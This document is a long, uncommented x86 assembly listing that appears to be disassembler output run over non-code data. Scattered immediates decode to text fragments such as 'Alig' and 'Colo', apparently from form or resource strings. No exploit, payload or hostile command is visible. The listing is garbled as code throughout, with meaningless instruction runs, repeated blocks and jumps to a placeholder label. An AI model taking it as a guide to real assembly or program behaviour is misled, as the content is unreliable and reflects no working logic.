add [ eax - 0xc ] ch
inc esp
add [ eax - 0x9 ] bl
inc esp
add [ eax ] dh
cmp eax 0x54060043
push eax
popad
outsb
insb
nop
[ ebx ] eax
pop es
push es
push esp
push eax
popad
outsb
insb
sbb [ ecx ] ah
inc ebx
add [ eax + r-xdata ] ah
or [ ebp + 0x78 ] al
je r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
fdivr [ esi ]
inc esp
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add bh bh
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
cwde
push edi
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
mov eax 0x100433e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ edi + esi ] dh
inc esp
add [ ebx ] bl
add bh bh
cwde
test [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
and al 0x57
inc ecx
add [ eax ] ah
add al [ eax ]
[ esi + edi + 0x10043 ]
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
adc al [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x4d546564
inc esp
add [ eax ] bl
add al [ eax ]
dec [ edi + edi ]
add [ eax ] al
adc [ edx ] 0x0
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax ] al
call [ esi ]
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
sbb [ edx ] al
add bh bh
or al 0x3f
dec ebp
inc esp
add [ edx ] dl
add al [ eax ]
call esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or eax [ edx + 0x6f ]
aas
inc esp
add [ eax + eax ] dh
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ eax - 0x6f ] ch
inc esp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jb r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
inc ebx
jb r-xdata
sbb al 0x2
add bh bh
sub [ edi ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
jb r-xdata
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
add [ eax ] al
dec esi
inc esp
add [ edx + eax ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
stc
inc esp
add [ ecx + edi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
test [ gs : esi ] bh
inc esp
add [ edi + ecx * 4 - 0x7023ffbc ] ch
inc esp
add al ah
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi + 0x6cff0001 ] ah
cli
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
imul ebp [ edi + 0x6e ] sub_422448
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ eax - 0x43ffbaf7 ] bh
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add bh bh
dec esp
xchg ecx eax
inc esp
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0xa0ff0000
nop
inc esp
add [ eax + 0x4490 ] dh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ eax ] al
sbb eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ 0x1dff0002 ] bl
add al [ eax ]
inc [ ecx ]
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
sbb al 0x37
adc [ eax ] al
test al 0x1
add bh bh
mov ah 0xe3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
mov eax 0xbc004509
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
je r-xdata
outsb
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
stc
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0x48ff0001
stc
int3
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
mov eax [ ebp ]
jl r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + edi * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
push eax
popad
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
fcom [ eax + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ es : edx ] cl
add bh bh
pop [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090028 ] al
je r-xdata
inc esp
adc [ eax ] al
0x20ff0000 0x4491
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
dec esp
mov es [ eax + eax + 0x60 ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x6c656c62
inc ebp
inc esp
add al al
add [ eax ] al
inc eax
add [ eax ] al
adc [ eax ] al
cdq
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
add bh bh
rol [ eax ] 0x0
add ah dh
stc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc esp
add [ ecx + edi * 8 + 0x44 ] dh
xor [ eax ] 0x0
jpe r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94227ee
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
loopne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
sub al 0x42
inc esp
add al ch
push eax
outsd
jo r-xdata
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc edi
je r-xdata
loopne r-xdata
pop eax
jo r-xdata
add [ eax ] al
jo r-xdata
inc eax
inc eax
inc esp
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0x406f666e
inc eax
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
cmp [ edx ] 0x0
or eax 0x65476e4f
je r-xdata
inc ecx
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
add [ eax ] al
inc ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
inc ebx
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub eax [ ebx ]
and [ ebx ] ch
inc ebx
add [ edx + eax ] ah
add [ eax ] al
pushad
rol [ ebx ] 0x1
mov esp 0x7c004214
xor eax [ eax ]
cld
jb r-xdata
mov eax 0xd8004440
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax + 0x4f0a0032 ] al
outsb
add bh bh
mov eax 0x1ff0001
pop eax
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax ] al
sub [ edi ] 0x0
adc ecx [ edi + 0x6e ]
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
inc esp
add [ eax - 0x4700ffff ] bh
test [ ebx ] dh
inc eax
add [ eax - 0x2d ] dl
je r-xdata
or eax 0x33840042
add [ eax - 0x2f ] ah
inc ebx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
inc esp
outsd
arpl [ ebx - 0x74 ] bp
inc edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
inc esp
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
popad
inc edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x2c ] bp
inc edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl [ edi + 0x6e ]
jb r-xdata
fmul [ edi - 0x501fffbc ]
inc ebx
je r-xdata
inc esp
add al al
inc edx
add [ ebx + esi - 0x2cafffc0 ] al
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
cmp [ ebx ] ch
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
test [ ebx ] dh
jb r-xdata
je r-xdata
add [ eax ] eax
inc [ ecx ]
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_422448
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
pop [ eax + eax - 0x20 ]
insb
jae r-xdata
add [ ecx * 4 + 0x474c0041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add [ eax + 0x47 ] ah
inc ebx
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ edx ] ch
inc ebx
add [ edx + edx * 8 + 0xb0043 ] ah
or [ ebp + 0x78 ] al
je r-xdata
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x474c0041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add [ eax + 0x47 ] ah
inc ebx
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x44 ] ah
inc ebx
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x63bffbc ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax ] ah
cli
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x30 ] 0xc80043fa
dec ecx
inc ebx
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x434960ff ]
add [ eax - 0x4bffbcb7 ] ah
dec ecx
inc ebx
add ah cl
dec ecx
inc ebx
add [ eax * 2 + 0x54110043 ] bh
inc ebx
jne r-xdata
inc esp
jb r-xdata
add bh bh
dec esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi + esi ] dh
inc esp
add [ ebx ] bl
add bh bh
cwde
test [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
fdivr [ esi ]
inc esp
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc esp
inc ebx
add al dh
add al [ ebp ]
sbb bl cl
inc esp
rol [ eax + eax - 0x40 ] cl
je r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc esp
inc ebx
add al dh
rol [ eax + eax - 0x40 ] cl
sub [ si + 0x44 ] al
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x30 ] bp
sub al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx ] ch
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
les eax [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cwde
push edi
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + 0x44 ] ah
inc ebx
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x63bffbc ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax ] ah
cli
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x30 ] 0xc80043fa
dec ecx
inc ebx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov [ ebx + eax * 2 ] gs
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
lodsb [ esi ]
sub eax [ ebx ]
xor al 0x2b
inc ebx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
insb
jae r-xdata
add [ gs : eax ] dl
xor eax [ esp + ebx + 0x37 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jae r-xdata
scasd [ edi ]
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x3e846564
inc esp
add [ edi + ecx * 4 - 0x7023ffbc ] ch
inc esp
add al ah
add [ ebx + ebp + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + eax * 2 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x43 ] bh
add [ eax ] ch
add al [ eax ]
add ah ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
stc
inc esp
add [ ecx + edi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
jmp [ eax - 0x4fffbb70 ]
jae r-xdata
add bh bh
mov al [ 0xffffffffb0004490 ]
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x6d657449 ] al
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
cld
inc edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x68437051
add [ eax ] al
add dh bh
add [ eax + 0x44 ] dh
add [ eax + 0x1 ] al
aas
inc esp
add [ eax + eax ] dh
sub_4327c9
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94227ee
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
inc edi
je r-xdata
loopne r-xdata
pop eax
jo r-xdata
inc eax
inc eax
inc esp
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0x406f666e
inc eax
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
cmp [ edx ] 0x0
or eax 0x65476e4f
je r-xdata
inc ecx
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
add [ eax ] al
inc ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub eax [ ebx ]
and [ ebx ] ch
inc ebx
add [ edx + eax ] ah
add [ eax ] al
pushad
rol [ ebx ] 0x1
mov esp 0x7c004214
xor eax [ eax ]
cld
jb r-xdata
mov eax 0xd8004440
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add bh bh
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
test [ ebx ] dh
inc eax
add [ eax - 0x2d ] dl
je r-xdata
or eax 0x33840042
add [ eax - 0x2f ] ah
inc ebx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
inc esp
outsd
arpl [ ebx - 0x74 ] bp
inc edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
inc esp
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
popad
inc edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x2c ] bp
inc edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ edi - 0x501fffbc ]
inc ebx
je r-xdata
inc esp
add al al
inc edx
add [ ebx + esi - 0x2cafffc0 ] al
insd
push edx
popad
